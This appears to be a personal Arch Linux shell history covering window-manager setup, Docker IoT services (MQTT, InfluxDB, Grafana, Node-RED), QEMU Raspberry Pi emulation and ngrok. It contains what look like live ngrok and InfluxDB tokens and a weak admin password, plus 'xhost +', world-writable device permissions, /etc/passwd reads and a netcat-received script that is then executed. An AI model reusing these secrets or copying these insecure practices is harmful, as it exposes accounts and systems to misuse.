pacman -Ss cpu benchmark
pacman -Ss intel benchmark
pacman -Ss benchmark-intel
pacman -Ss benchmark intel
pacman -Ss benchmark cpu
sudo pacman -S xmrig
pacman -Ss benchmark cpi
OctaneBench
yay -S octane-bench
yay -Ss benchmark
yay -Ss cine bench
nc 10.10.12.75 9998
qemu-system-aarch64 \
    -machine virt \
    -cpu cortex-a57 \
    -m 1024 \
    -bios /usr/share/edk2/aarch64/QEMU_EFI.fd \
    -nographic \
    -drive if=none,file=alpine-aarch64.qcow2,format=qcow2,id=hd0 \
    -device virtio-blk-device,drive=hd0 \
    -netdev user,id=net0,hostfwd=tcp::1883-:1883,hostfwd=tcp::9001-:9001 \
    -device virtio-net-device,netdev=net0
cd wisp/aarch64/
cd qemu
feh --bg-fill  ~/Pictures/anime.jpg
cp -r ~/.config/chadwm/eww ~/.config/
sudo nvim /usr/share/xsessions/chadwm.desktop
nvim /usr/share/xsessions/chadwm.desktop
sudo touch /usr/share/xsessions/chadwm.desktop
sudo pacman -S xorg-xsetroot
pacman -S xorg-xsetroot
sx sh ~/.config/chadwm/scripts/run.sh
mv eww ~/.config
cd ~/dwm/chadwm/chadwm/
sudo pacman -Ss xsetroot
sudo pacman -S xsetroot
sudo make  install
cd dwm/
nvim ~/.Xresources
nvim ~/.Xre
feh --bg-max  ~/Pictures/anime.jpg
man feh
feh --bg-zoom  ~/Pictures/anime.jpg
feh --bg-center  ~/Pictures/anime.jpg
feh --bg-scale ~/Pictures/anime.jpg
nvim ~/.xinitrc
cat ~/.xinitrc
sudo pacman -Ss  transset-df
sudo pacman -Ss  transset-df xcompmgr
sudo pacman -S  xcompmgr
sudo pacman -S transset-df xcompmgr
pacman -S transset-df xcompmgr
sudo wvdial
screen /dev/ttyACM0  9600
pkill screen
ls -l /dev/tty*
sudo vim /etc/wvdial.conf
sudo pacman -S wvdial
pacman -Ss wvdial
sudo chmod 666 /dev/ttyACM0
ls /dev/tty*
sudo chmod 666 /dev/ttyUSB0
sudo systemctl status bluetooth
sudo systemctl enable bluetooth
sudo systemctl start bluetooth

pacman -Ss btusb
modprobe btusb
sudo systemctl enable bluetooth.service
pacman -Ss bthctl
pacman -Ss btctl
cd factorio/
git clone https://aur.archlinux.org/factorio.git
cd games/
sudo pacman -S qbittorrent
open htop.txt
ls -lh
cat htop.txt
htop >> htop.txt
which alacritty
which ala
brightnessctl 60%
/org/freedesktop/UPower/devices/battery_BAT0
cat ~/Documents/battery_warn.sh
cat ACM-SUMMER-SCHOOL-KARE/best_short_term_model.pth
cat  dashboard.js
ls dashboard.js
cat ~/nvidia-fw-backup/ga100/
cat ~/nvidia-fw-backup/575.64/
cat config.h  | grep kitty
nvim config.h | grep kitty
nvim config.h | kitty
sudo make clean install
cd dwm/chadwm/chadwm/
nvim ~/Documents/battery_warn.sh
chmod +x ~/Documents/battery_warn.sh
ls ~/Documents/
cd MQTT/MQTT\ Pub\ \&\ Sub/
chmod 666 /dev/ttyUSB0
docker logs 06c1823a376d
docker logs -f mqttbrokersetupusingdocker-mosquitto-1

docker logs -f mosquitto

nvim  docker-compose.yml
cat config/mosquitto.conf
cat docker-compose.yml
cd MQTT\ Broker\ Setup\ Using\ Docker/
cd ACM-SUMMER-SCHOOL-KARE/Raspberry\ PI/
nvim api.txt
cat api.txt | xclip
cat api.txt
cat /etc/passwd | grep 747
cat /etc/passwd | grep 777
cat /etc/passwd | grep 666
cat /etc/passwd | grep 472
cat /etc/passwd | grep 1000
docker logs nodered
docker run -d \
  --name nodered \
  --net=iot \
  -p 1880:1880 \
  -v "$PWD/nodered_data:/data" \
  -e TZ="Asia/Kolkata" \
  --restart always \
  nodered/node-red

docker rm -f nodered
sudo chown -R 1000:1000 ./nodered_data

docker run --rm \
  -v "$PWD/nodered_data:/data" \
  nodered/node-red \
  chown -R node-red:node-red /data

docker rm -f nodered

/usr/src/node-red/node_modules/node-red
docker run -d   --name nodered   --net=iot   -p 1880:1880   -v $PWD/nodered_data:/data   -e TZ="Asia/Kolkata"   --restart always   nodered/node-red
sudo chown 472:472 -R  nodered_data/
mkdir -p nodered_data
rm -rf nodered_data/
docker stop nodered
ls grafana_data/
docker ops
sudo docker run -d \
                               --name influxdb2 \
                               --net=iot \
-p  8086:8086 \
                               -v "$PWD/influxdb_data:/var/lib/influxdb2" \
                               -e DOCKER_INFLUXDB_INIT_MODE=setup \
                               -e DOCKER_INFLUXDB_INIT_USERNAME=admin \
                               -e DOCKER_INFLUXDB_INIT_PASSWORD=qwerty123456 \
                               -e DOCKER_INFLUXDB_INIT_ORG=acm_iot \
                               -e DOCKER_INFLUXDB_INIT_BUCKET=iot \
                               --restart unless-stopped \
                               influxdb:2.7

docker rm -f influxdb2
docker stop fb2a3a4f355c
mv battery_warn.sh  ~/Documents/
which dunst
dunst
sudo pacman -S dunst
cat battery_warn.sh
./battery_warn.sh
chmod +x ./battery_warn.sh
nvim battery_warn.sh
nc -l -p 6969 > battery_warn.sh
docker logs 06f600639ea1
docker run -d   --name grafana2   --net=iot   -p 3000:3000   -v $PWD/grafana_data:/var/lib/grafana   --restart always   grafana/grafana-oss
docker rm -f grafana2
docker stop db455d9e1931
docker logs db455d9e1931
docker logs bd57e4203f3d
sudo chown 472:472 -R  grafana_data/
sudo chown 472:472 -R
docker rm grafana2
docker stop 52719473d628
docker stop b33829f7c61e
docker inspect influxdb2

docker network connect iot influxdb2

docker inspect influxdb2 | grep -A 5 "Networks"

docker network create iot
docker stop 75af7f407ebc
docker run -d   --name grafana2      -p 3000:3000   -v $PWD/grafana_data:/var/lib/grafana   --restart always   grafana/grafana-oss
docker run -d   --name grafana      -p 3000:3000   -v $PWD/grafana_data:/var/lib/grafana   --restart always   grafana/grafana-oss
docker run -d   --name grafana   --net=iot   -p 3000:3000   -v $PWD/grafana_data:/var/lib/grafana   --restart always   grafana/grafana-oss
echo "7d9FeoA0ERCXwNmH7Fmgw1yN5UtAomM6ntDkTw96QDkhTWnjVc7an20iIOOXp5PMTlzb5vAjGdXPa1umlV5bpQ==" >> api.txt
sudo docker run -d \
                               --name influxdb2 \
    -p 8086:8086 \
                               -v "$PWD/influxdb_data:/var/lib/influxdb2" \
                               -e DOCKER_INFLUXDB_INIT_MODE=setup \
                               -e DOCKER_INFLUXDB_INIT_USERNAME=admin \
                               -e DOCKER_INFLUXDB_INIT_PASSWORD=qwerty123456 \
                               -e DOCKER_INFLUXDB_INIT_ORG=acm_iot \
                               -e DOCKER_INFLUXDB_INIT_BUCKET=iot \
                               --restart unless-stopped \
                               influxdb:2.7

sudo docker run -d \
                               --name influxdb4 \
                               --net=POCO \
-p  8086:8086 \
                               -v "$PWD/influxdb_data:/var/lib/influxdb2" \
                               -e DOCKER_INFLUXDB_INIT_MODE=setup \
                               -e DOCKER_INFLUXDB_INIT_USERNAME=admin \
                               -e DOCKER_INFLUXDB_INIT_PASSWORD=qwerty123456 \
                               -e DOCKER_INFLUXDB_INIT_ORG=acm_iot \
                               -e DOCKER_INFLUXDB_INIT_BUCKET=iot \
                               --restart unless-stopped \
                               influxdb:2.7

docker rm influxdb4
docker rm influxdb3
sudo docker run -d \
                               --name influxdb3 \
                               --net=POCO \
-p  8086:8086 \
                               -v "$PWD/influxdb_data:/var/lib/influxdb2" \
                               -e DOCKER_INFLUXDB_INIT_MODE=setup \
                               -e DOCKER_INFLUXDB_INIT_USERNAME=admin \
                               -e DOCKER_INFLUXDB_INIT_PASSWORD=qwerty123456 \
                               -e DOCKER_INFLUXDB_INIT_ORG=acm_iot \
                               -e DOCKER_INFLUXDB_INIT_BUCKET=iot \
                               --restart unless-stopped \
                               influxdb:2.7

docker rm influxdb2
sudo docker run -d \
                               --name influxdb2 \
                               --net=POCO \
-p  8086:8086 \
                               -v "$PWD/influxdb_data:/var/lib/influxdb2" \
                               -e DOCKER_INFLUXDB_INIT_MODE=setup \
                               -e DOCKER_INFLUXDB_INIT_USERNAME=admin \
                               -e DOCKER_INFLUXDB_INIT_PASSWORD=qwerty123456 \
                               -e DOCKER_INFLUXDB_INIT_ORG=acm_iot \
                               -e DOCKER_INFLUXDB_INIT_BUCKET=iot \
                               --restart unless-stopped \
                               influxdb:2.7

docker stop be9e6eefe420
docker stop a
docker inspect influxdb2 | grep -A 10 "Networks"

docker network ls
sudo docker run -d \
                               --name influxdb2 \
                               -p 8086:8086 \
                               -v "$PWD/influxdb_data:/var/lib/influxdb2" \
                               -e DOCKER_INFLUXDB_INIT_MODE=setup \
                               -e DOCKER_INFLUXDB_INIT_USERNAME=admin \
                               -e DOCKER_INFLUXDB_INIT_PASSWORD=qwerty123456 \
                               -e DOCKER_INFLUXDB_INIT_ORG=acm_iot \
                               -e DOCKER_INFLUXDB_INIT_BUCKET=iot \
                               --restart unless-stopped \
                               influxdb:2.7

sudo pacman -S openbsd-netcat
mkdir -p influxing
arduino-ide DHT11___BMP280.ino
wget https://raw.githubusercontent.com/TakMashhido/ACM-SUMMER-SCHOOL-KARE/refs/heads/main/ESP8266/DHT11___BMP280/DHT11___BMP280.ino
cat weather_data.csv
python mqtt_data_collector.py
nvim mqtt_data_collector.py
cat weather_data1.csv
cat weather_data1.csv >> weather_data.csv
npm install react
open L_2_2_llm_intro.ipynb
wget https://raw.githubusercontent.com/TakMashhido/ACM-SUMMER-SCHOOL-KARE/refs/heads/main/llmcode/L_2_2_llm_intro.ipynb
cd acm
cd ~/ACM-SUMMER-SCHOOL-KARE/Projects/Fog\ Computing-Based\ Weather\ Forecasting\ with\ NodeMCU,\ Raspberry\ Pi,\ and\ LSTM/Data\ Collection/
cat mqtt_data_collector.py
cat Projects\\Fog\ Computing-Based\ Weather\ Forecasting\ with\ NodeMCU,\ Raspberry\ Pi,\ and\ LSTM\\Data\ Collection\\weather_data.csv
rm weather_data.csv
cd Data\ Collection/
cd Projects/Fog\ Computing-Based\ Weather\ Forecasting\ with\ NodeMCU,\ Raspberry\ Pi,\ and\ LSTM/
sudo qemu-system-aarch64 \
  -machine virt \
  -cpu cortex-a57 \
  -m 1024 \
  -bios /usr/share/edk2/aarch64/QEMU_EFI.fd \
  -nographic \
  -drive if=none,file=alpine-aarch64.qcow2,format=qcow2,id=hd0 \
  -device virtio-blk-device,drive=hd0 \
  -netdev tap,id=net0,ifname=tap0,script=no,downscript=no \
  -device virtio-net-device,netdev=net0

qemu-system-aarch64 \
  -machine virt \
  -cpu cortex-a57 \
  -m 1024 \
  -bios /usr/share/edk2/aarch64/QEMU_EFI.fd \
  -nographic \
  -drive if=none,file=alpine-aarch64.qcow2,format=qcow2,id=hd0 \
  -device virtio-blk-device,drive=hd0 \
  -netdev tap,id=net0,ifname=tap0,script=no,downscript=no \
  -device virtio-net-device,netdev=net0

cat Data_Publisher_for_MQTT_Broker.ino
cd Data_Publisher_for_MQTT_Broker/
sudo mkdir -p /etc/X11/xorg.conf.d
sudo nano /etc/X11/xorg.conf.d/40-libinput.conf

xinput list

sudo libinput list-devices

libinput list-devices

cd st/
cd st
cdd st/
which snazzy-terminal
nvim config.def.h
which st
sudo rm /usr/local/bin/st
which dmenu
sudo pacman -S dmenu

echo $PATH

dmenu
sudo pacman -S obsidian
sudo pacman -Ss obsidian
cat web.py
python web.py
source venv/bin/activate.fish
cat webserver/webserver.ino
cat /home/bb/.config/ngrok/ngrok.yml
ngrok config add-authtoken 2yx0by8uoV8qsDxv8MCtKTvEmd0_oMaFvXqQGsHVvSM7Nexx
sudo pacman -S  python-pyngrok
sudo python-pyngrok
yay -S ngrok
sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
curl https://ngrok-agent.s3.amazonaws.com/ngrok.asc
curl -s https://api.github.com/repos/ngrok/ngrok/releases/latest \
| grep "browser_download_url.*linux-amd64.zip" \
| cut -d '"' -f 4 \
| wget -i -

touch /etc/apt/trusted.gpg.d/ngrok.asc
curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc \
  | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null \
  && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \
  | sudo tee /etc/apt/sources.list.d/ngrok.list \
  && sudo apt update \
  && sudo apt install ngrok
cd ~/acm/
sudo tcpdump -i wlan0 port 1883

cat  publisher.py
sudo lsof -i :1883
ip -a
sudo lsof -i :1883

sudo lsof -i :1884

sudo tcpdump -i wlan0 port 1883
tcpdump -i wlan0 port 1883
sudo pacman -S tcpdump
ip a | grep inet

ls'
'
sudo ip addr add 192.168.100.1/24 dev br0

# Create bridge
sudo ip link add name br0 type bridge

# Create TAP device and assign it to current user
sudo ip tuntap add dev tap0 mode tap user $USER

# Attach TAP to bridge
sudo ip link set tap0 master br0

# Bring interfaces up
sudo ip link set tap0 up
sudo ip link set br0 up

sudo ip link delete tap0
sudo ip link delete br0

sudo ip tuntap add dev tap0 mode tap
sudo ip link set tap0 up
sudo brctl addif br0 tap0  # Assuming br0 exists, otherwise create a bridge


sudo pacman -S bridge-utils

ip link show tap0

# 1. Create a bridge interface
sudo ip link add name br0 type bridge

# 2. Create a TAP device
sudo ip tuntap add dev tap0 mode tap user $USER

# 3. Attach the TAP to the bridge
sudo ip link set dev tap0 master br0

# 4. Bring both interfaces up
sudo ip link set dev tap0 up
sudo ip link set dev br0 up

sudo pacman -Ss brt
sudo pacman -Ss brtctl
sudo pacman -S brtctl
python publisher1.py
nvim publisher1.py
mosquitto_sub -h 127.0.0.1 -p 1883 -t iot/class/test -v

sudo pacman -S mosquitto
sudo pacman -Ss mosquitto
sudo pacman -Ss mosquitto_sub
sudo pacman -S lsof
qemu-system-aarch64 \
  -machine virt \
  -cpu cortex-a57 \
  -m 1024 \
  -bios /usr/share/edk2/aarch64/QEMU_EFI.fd \
  -nographic \
  -drive if=none,file=alpine-aarch64.qcow2,format=qcow2,id=hd0 \
  -device virtio-blk-device,drive=hd0 \
  -netdev user,id=net0,\
hostfwd=tcp::1883-:1883,hostfwd=tcp::9001-:9001 \
  -device virtio-net-device,netdev=net0

sudo ss -tuln | grep 1884

cd mq
cd config/
nvim mosquitto.db
cd data/
sudo cat data/mosquitto.db
cat data/mosquitto.db
sudo cat log/mosquitto.log
cat log/mosquitto.log
nvim Data_Publisher_for_MQTT_Broker/Data_Publisher_for_MQTT_Broker.ino
cd MQTT\ Based\ Smart\ Factory/
pip install requests
pip install flask
pip install pyngrok
python -m  venv venv
yay -S python-pyngrok

nvim web.py
sudo pacman -Ss pyngrok
sudo pacman -Ss ngrok
sudo pacman -Ss python-ngrok
sudo pacman -Ss python-pyngrok
sudo pacman -S python-flask
mkdir acm
nvim config/mosquitto.conf
ping 192.168.23.253
curl http://192.168.23.253
curl 192.168.23.253
qemu-system-aarch64 \
  -machine virt \
  -cpu cortex-a57 \
  -m 1024 \
  -bios /usr/share/edk2/aarch64/QEMU_EFI.fd \
  -nographic \
  -drive if=none,file=alpine-aarch64.qcow2,format=qcow2,id=hd0 \
  -device virtio-blk-device,drive=hd0 \
  -netdev user,id=net0 \
  -device virtio-net-device,netdev=net0

cd ~/qemu/wisp/aarch64/
cat install.sh
qemu-system-aarch64 \
  -machine virt \
  -cpu cortex-a57 \
  -m 1024 \
  -bios /usr/share/edk2/aarch64/QEMU_EFI.fd \
  -nographic \
  -cdrom alpine-virt-3.22.0-aarch64.iso \
  -drive if=none,file=alpine-aarch64.qcow2,format=qcow2,id=hd0 \
  -device virtio-blk-device,drive=hd0 \
  -netdev user,id=net0 \
  -device virtio-net-device,netdev=net0

ps -aux | grep qemu
cd ~/qemu
find / -type f -name 'QEMU_EFI.fd' 2>/dev/null

wget https://deb.debian.org/debian/pool/main/q/qemu-efi-aarch64/qemu-efi-aarch64_2025.02-8_all.deb

wget http://ftp.us.debian.org/debian/pool/main/q/qemu-efi-aarch64/qemu-efi-aarch64_2023.11-2_all.deb

ls /usr/share/edk2-armvirt/QEMU_EFI.fd

yay -S edk2-armvirt

ls /usr/share/edk2-aarch64/QEMU_EFI.fd

yay -S edk2-aarch64

mkdir -p ~/qemu-firmware
cd ~/qemu-firmware

wget https://github.com/96boards-hikey/tools-images-hikey960/raw/master/qemu/EFI/QEMU_EFI.fd

wget https://github.com/tianocore/edk2/raw/master/Build/AARCH64/DEBUG_GCC5/FV/QEMU_EFI.fd -O ~/qemu-firmware/QEMU_EFI.fd

wget https://github.com/bhanv/linux-firmware-drops/releases/download/qemu-efi-aarch64/QEMU_EFI.fd -O ~/qemu-firmware/QEMU_EFI.fd

wget https://releases.linaro.org/components/kernel/uefi-linaro/latest/qemu64/QEMU_EFI.fd

mkdir -p ~/qemu-firmware
cd ~/qemu-firmware

qemu-system-aarch64 -bios /path/to/file ...

sudo pacman -Ss bios
sudo pacman -S bios
sudo pacman -S buis
-bios /usr/share/edk2-aarch64/QEMU_EFI.fd

find ~ QEMU_EFI
ls find   -n "QEMU_EFI.fd"
ls find  ~ -n "QEMU_EFI.fd"
sudo pacman -Ss edk2-aarch
firefox
which edk2-aarch64
ls /usr/share/

ls  /usr/share/edk2-aarch64/QEMU_EFI.fd
sudo pacman -S edk2-aarch64

qemu-system-aarch64 \
  -machine virt \
  -cpu cortex-a57 \
  -m 1024 \
  -nographic \
  -bios /usr/share/qemu-efi-aarch64/QEMU_EFI.fd \
  -cdrom alpine-virt-3.22.0-aarch64.iso \
  -drive if=none,file=alpine-aarch64.qcow2,format=qcow2,id=hd0 \
  -device virtio-blk-device,drive=hd0 \
  -netdev user,id=net0 \
  -device virtio-net-device,netdev=net0

qemu-img create -f qcow2 alpine-aarch64.qcow2 20G
wget https://dl-cdn.alpinelinux.org/alpine/v3.22/releases/aarch64/alpine-virt-3.22.0-aarch64.iso

rm alpine-standard-3.22.0-aarch64.iso

qemu-system-aarch64 \
  -machine virt \
  -cpu cortex-a57 \
  -m 1024 \
  -nographic \
  -bios /usr/share/qemu-efi-aarch64/QEMU_EFI.fd \
  -cdrom alpine-virt-3.20.0-aarch64.iso \
  -drive if=none,file=alpine-standard-3.22.0-aarch64.iso,format=qcow2,id=hd0 \
  -device virtio-blk-device,drive=hd0 \
  -netdev user,id=net0 \
  -device virtio-net-device,netdev=net0

qemu-img create -f qcow2 alpine-standard-3.22.0-aarch64.iso  20G

sudo pacman -S qemu-system-aarch64
sudo pacman -S qemu-arch-extra edk2-aarch64
ls qemu-rpi-kernel/
cd qemu/
nvim install.sh
mv ../alpine-standard-3.22.0-aarch64.iso  ../aarch64/
cd aarch64/
mv ~/Downloads/alpine-standard-3.22.0-aarch64.iso  ~/qemu/wisp/
cd wisp/
cd wi
screen 3 firefox
screen 3 firefoxd
sudo pacman -S screen
git clone https://github.com/tsoding/wisp.git
sudo chown $USER:$USER ~/.Xauthority

ls -l ~/.Xauthority

xhost +

@sxhost +

echo $DISPLAY

rofi -show drun

which rofi

sudo pacman -S rofi    # Arch
sudo apt install rofi  # Debian/Ubuntu

dmenu_run

which demenu
sudo pacman -S dmenu
sudo make clean install

sed -i 's/snazzy-terminal/xterm/g' config.def.h

xterm
sudo pacman -S xfce4 xterm

pkill x
ps -aux | grep -s x
ps -aux | grep x
pkill chadwm
ps -aux | grep chad
ps -aux | grep ch
which kitty
sudo pacman -S kitty
lsa
exec chadwm > ~/.chadwm.log 2>&1

cat  ~/.config/chadwm/scripts/run.sh
sudo startx ~/.config/chadwm/scripts/run.sh
startx ~/.config/chadwm/scripts/run.sh
snazzy-terminal

cd ~/d/c/chadwm
sudo make clean install

sudo make clean
make
sudo cp -f st /usr/local/bin/snazzy-terminal

nvim run.sh
mv .Xresources  ~/
mv ~/.Xresources  ~/.Xresourcesbck
cat ~/.Xresources
code config.def.h
sudo make clean install  + 2>error.txt
sudo make clean install | less
sed -i 's/{ SHCMD("snazzy-terminal") }/SHCMD("snazzy-terminal")/' config.def.h

snazzy-terminal
sudo ln -s /home/bb/dwm/st/st /usr/local/bin/snazzy-terminal

which snazzy-terminal

sudo mv /usr/local/bin/st /usr/local/bin/st.bak  # backup system st just in case
sudo ln -s /home/bb/dwm/st/st /usr/local/bin/st

nano ~/.bashrc

rm -rf  ~/.vimrc
vim ~/.vimrc
vim config.def.h
sudo pacman -S gd
pacman -S gd
cat config.def.h
cd chadwm/chadwm/
which dwm
git clone https://github.com/siduck/st.git
git clone https://github.com/siduck/st.git ~/dwm/
sudo pacman -Ss shell
find ~ -type f -exec du -h {} + 2>/dev/null  | sort -h | tail -n 50
rm /home/bb/.local/share/Trash/files/2017-04-10-raspbian-jessie(1).zip

rm /home/bb/.local/share/Trash/files/2017-04-10-raspbian-jessie.zip

rm /home/bb/Downloads/2017-04-10-raspbian-jessie.img

rm /home/bb/Documents/ubuntu-22.04.5-desktop-amd64.iso

rm /home/bb/Downloads/ubuntu-22.04.5-desktop-amd64.iso

find ~ -type f -exec du -h {} + 2>/dev/null  | sort -h | tail -n 50 | tac
qemu-system-arm \
              -kernel kernel-qemu-5.10.63-bullseye \
              -cpu arm1176 \
              -m 256M \
              -M versatilepb \
              -dtb versatile-pb.dtb \
              -no-reboot \
              -append "root=/dev/sda2 rootfstype=ext4 rw console=ttyAMA0,115200" \
              -hda raspios.img \
              -nographic \
              -net nic -net user
lsblk /dev/loop2
sudo e2fsck -f /dev/loop2p2
sudo resize2fs /dev/loop2p2

lsblk /dev/loop2

sudo losetup -d /dev/loop2
sudo losetup -Pf --show raspios.img

sudo parted /dev/loop2

sudo lsblk -f /dev/loop2p2
sudo tune2fs -l /dev/loop2p2 | grep 'Block count\|Block size'

sudo resize2fs  /dev/loop2p2
sudo e2fsck -f  /dev/loop2p2
sudo e2fsck  /dev/loop2p2
sudo losetup -Pf --show raspios.img

sudo losetup -d /dev/loop2

lsblk -l
qemu-system-arm \
              -kernel kernel-qemu-5.10.63-bullseye \
              -cpu arm1176 \
              -m 256M \
              -M versatilepb \
              -dtb versatile-pb.dtb \
              -no-reboot \
              -append "root=/dev/sda2 rootfstype=ext4 rw console=ttyAMA0,115200 init=/bin/bash" \
              -hda raspios.img \
              -nographic \
              -net nic -net user
truncate -s +10G raspios.img

fdisk  -l raspios.img
mv raspios  raspios.img
xz -d raspios.xz
xz -d raspios.zip
mv raspios.zip raspios.xz
unzip raspios.zip
wget https://downloads.raspberrypi.org/raspios_lite_armhf_latest -O raspios.zip
rm -rf 2025-05-13-raspios-bookworm-arm64-lite.img  2025-05-13-raspios-bookworm-armhf-lite.img
sudo losetup -Pf --show 2025-05-13-raspios-bookworm-armhf-lite.img
lsblk

sudo kpartx -av 2025-05-13-raspios-bookworm-armhf-lite.img

kpartx -av 2025-05-13-raspios-bookworm-armhf-lite.img

qemu-system-arm \
              -kernel kernel-qemu-5.10.63-bullseye \
              -cpu arm1176 \
              -m 256M \
              -M versatilepb \
              -dtb versatile-pb.dtb \
              -no-reboot \
              -append "root=/dev/sda2 rootfstype=ext4 rw console=ttyAMA0,115200" \
              -hda 2025-05-13-raspios-bookworm-armhf-lite.img \
              -nographic \
              -net nic -net user
qemu-img create -f qcow2 2025-05-13-raspios-bookworm-armhf-lite.img  10G
qemu-system-arm \
              -kernel kernel-qemu-5.10.63-bullseye \
              -cpu arm1176 \
              -m 256M \
              -M versatilepb \
              -dtb versatile-pb.dtb \
              -no-reboot \
              -append "root=/dev/sda2 rootfstype=ext4 rw console=ttyAMA0,115200 init=/bin/bash" \
              -hda 2025-05-13-raspios-bookworm-armhf-lite.img \
              -nographic \
              -net nic -net user
xz -d 2025-05-13-raspios-bookworm-armhf-lite.img.xz
mv ~/Downloads/2025-05-13-raspios-bookworm-armhf-lite.img.xz  ~/qemu/qemu-rpi-kernel/
cd qemu-rpi-kernel/
cat live_prediction.py
cd Fog\ Computing-Based\ Weather\ Forecasting\ with\ NodeMCU,\ Raspberry\ Pi,\ and\ LSTM/
vim  subscriber.py
cat  ../../../ACM-SUMMER-SCHOOL-KARE/Projects/Fog\ Computing-Based\ Weather\ Forecasting\ with\ NodeMCU,\ Raspberry\ Pi,\ and\ LSTM/Data\ Collection/mqtt_data_collector.py  | grep "10."
vim mqtt_data_collector.py
cd ..\
ls
arduino-ide Data_Publisher_for_MQTT_Broker.ino
vim Data_Publisher_for_MQTT_Broker.ino
vim Projects/Fog\ Computing-Based\ Weather\ Forecasting\ with\ NodeMCU,\ Raspberry\ Pi,\ and\ LSTM/Data\ Collection/Data_Publisher_for_MQTT_Broker/Data_Publisher_for_MQTT_Broker.ino
l;s
cd Projects/Fog\ Computing-Based\ Weather\ Forecasting\ with\ NodeMCU,\ Raspberry\ Pi,\ and\ LSTM/Data\ Collection/Data_Publisher_for_MQTT_Broker/
cat Projects/Fog\ Computing-Based\ Weather\ Forecasting\ with\ NodeMCU,\ Raspberry\ Pi,\ and\ LSTM/Data\ Collection/mqtt_data_collector.py
sudo usermod -a -G dialout $USER
stat /dev/ttyUSB0

git clone https://github.com/TakMashhido/ACM-SUMMER-SCHOOL-KARE.git
sudo rm -rf ACM-SUMMER-SCHOOL-KARE/
rm -rf ACM-SUMMER-SCHOOL-KARE/
git pull -q https://github.com/TakMashhido/ACM-SUMMER-SCHOOL-KARE.git
sudo git rebase --continue

git commit -m "work ffs"
sudo git add .
git rebase --continue

sudo mv Raspberry\ PI/MQTT\ Broker\ Setup\ Using\ Docker/config/passwd_file  ~/Downloads/pasas2
mv Raspberry\ PI/MQTT\ Broker\ Setup\ Using\ Docker/config/passwd_file  ~/Downloads/pasas2
mv Raspberry\ PI/MQTT\ Broker\ Setup\ Using\ Docker/config/passwd_file  ~/Downloads/
sudo mv MQTT/config/passwd_file ~/Downloads/
mv MQTT/config/passwd_file ~/Downloads/
git config pull.rebase true
git pul -q https://github.com/TakMashhido/ACM-SUMMER-SCHOOL-KARE.git
git pull -q
git pull --help
git --help
git commit -m "backup"
cat CoAP/controller.py
ls CoAP/controller.py
mv 2025-05-13-raspios-bookworm-arm64-lite.img  qemu-rpi-kernel/
git clone https://github.com/dhruvvyas90/qemu-rpi-kernel.git
qemu-system-aarch64  2025-05-13-raspios-bookworm-arm64-lite.qcow2 -m 2048 -machine raspi4b
qemu-system-aarch64  2025-05-13-raspios-bookworm-arm64-lite.qcow2 -m 2048
qemu-system-aarch64  -machine help
sudo chmod 666 /dev/
mount | grep '/home/bb/Downloads/ubuntu'

sudo umount -l /home/bb/Downloads/ubuntu/var/run/docker.sock
sudo umount -l /home/bb/Downloads/ubuntu/tmp
sudo umount -l /home/bb/Downloads/ubuntu/run
sudo umount -l /home/bb/Downloads/ubuntu/dev/shm
sudo umount -l /home/bb/Downloads/ubuntu/dev/pts
sudo umount -l /home/bb/Downloads/ubuntu/dev
sudo umount -l /home/bb/Downloads/ubuntu/sys
sudo umount -l /home/bb/Downloads/ubuntu/proc

sudo umount -l /path     # lazy unmount

sudo mount --bind /var/run/docker.sock /home/bb/Downloads/ubuntu/var/run/docker.socksudo umount /home/bb/Downloads/ubuntu/var/run/docker.sock
sudo umount /home/bb/Downloads/ubuntu/tmp
sudo umount /home/bb/Downloads/ubuntu/run
sudo umount /home/bb/Downloads/ubuntu/dev/shm
sudo umount /home/bb/Downloads/ubuntu/dev/pts
sudo umount /home/bb/Downloads/ubuntu/dev
sudo umount /home/bb/Downloads/ubuntu/sys
sudo umount /home/bb/Downloads/ubuntu/proc

sudo chroot . /bin/fish
sudo mount --bind /var/run/docker.sock /home/bb/Downloads/ubuntu/var/run/docker.sock
sudo systemctl restart docker
sudo cp -L /etc/resolv.conf /home/bb/Downloads/ubuntu/etc/resolv.conf

sudo mount --bind /proc /home/bb/Downloads/ubuntu/proc
sudo mount --bind /sys /home/bb/Downloads/ubuntu/sys
sudo mount --bind /dev /home/bb/Downloads/ubuntu/dev
sudo mount --bind /dev/pts /home/bb/Downloads/ubuntu/dev/pts
sudo mount --bind /dev/shm /home/bb/Downloads/ubuntu/dev/shm
sudo mount --bind /run /home/bb/Downloads/ubuntu/run
sudo mount --bind /tmp /home/bb/Downloads/ubuntu/tmp
tar -zcvf oai-cn5g.tar.gz oai-cn5g/
cd home/
cd Downloads/ubuntu/
cd ~/Downloads/ubuntu/
git clone https://aur.archlinux.org/boost-process.git
cd boost-process

sudo pacman -S yay
sudo apt install libboost-process-dev
yay -S boost-process

sudo apt install libboost-process-dev

cmake ../ -DCMAKE_POLICY_VERSION_MINIMUM=3.5

nano ~/uhd/host/lib/include/uhdlib/usrp/dboard/fbx/fbx_constants.hpp

grep -r "uint32_t" ~/uhd/host/ | grep -v cstdint

nano ~/uhd/host/include/uhd/features/ref_clk_calibration_iface.hpp

cd host
rm -rf build
mkdir build && cd build
cmake ../ -DCMAKE_POLICY_VERSION_MINIMUM=3.5
make -j$(nproc)

cd ~/uhd
git checkout tags/v4.8.0.0 -b build-v4.8.0.0

mkdir build && cd build
cmake ../
make -j$(nproc)
make test
cd host
git clone https://github.com/EttusResearch/uhd.git ~/uhd
cd ~/uhd
git checkout v4.8.0.0

sudo pacman -Syu --needed \
  base-devel \
  git \
  cmake \
  boost \
  python \
  python-mako \
  python-numpy \
  python-requests \
  python-scipy \
  python-setuptools \
  python-ruamel-yaml \
  doxygen \
  libusb \
  ncurses \
  inetutils \
  ethtool \
  ccache \
  gcc

sudo pacman -S autoconf automake build-essential ccache cmake cpufrequtils doxygen ethtool g++ git inetutils-tools libboost-all-dev libncurses-dev libusb-1.0-0 libusb-1.0-0-dev libusb-dev python3-dev python3-mako python3-numpy python3-requests python3-scipy python3-setuptools python3-ruamel.yaml
docker compose pull
cd oai-cn5g/
xinit
sudo pacman -S eww
vim chadwm/config.def.h
vim scripts/run.sh
cat ~/.config/chadwm/scripts/run.sh
brightnessctl set 80%

sudo pacman -S brightnessctl

sudo xbacklight -set 10 &

xbacklight -set 10 &

sudo pacman -S picom
sudo pacman -S feh
sudo pacman -S acpi
sudo pacman -S rofi
chmod +x ~/.xinitrc
vim ~/.xinitrc
